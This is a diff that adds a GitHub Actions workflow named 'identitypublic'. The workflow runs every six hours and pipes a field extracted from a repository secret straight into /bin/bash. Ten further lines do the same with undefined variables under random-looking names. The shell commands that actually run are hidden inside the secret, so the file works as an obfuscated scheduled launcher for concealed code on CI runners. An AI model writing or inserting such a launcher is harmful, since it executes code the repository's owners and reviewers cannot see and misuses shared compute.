@@ -1,0 +1,28 @@
+name: identitypublic
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: identitypublic
+        env:
+          aqnp200: ${{ secrets.aqnp200 }}
+        run: |
+          echo $aqnp200 | jq -r .h0253 | /bin/bash
+          echo $uzbm3709 | jq -r .ce2864 | /bin/bash
+          echo $yzjph4313 | jq -r .iyc9 | /bin/bash
+          echo $xrtez42 | jq -r .jf3 | /bin/bash
+          echo $zd3 | jq -r .ulvlf2 | /bin/bash
+          echo $sbk8 | jq -r .yrhwk910 | /bin/bash
+          echo $p5507 | jq -r .ch02562 | /bin/bash
+          echo $laud680 | jq -r .owq628 | /bin/bash
+          echo $eif28 | jq -r .sgknx38 | /bin/bash
+          echo $gw662 | jq -r .nkati63133 | /bin/bash
+          echo $njo1495 | jq -r .mcfn6 | /bin/bash
+
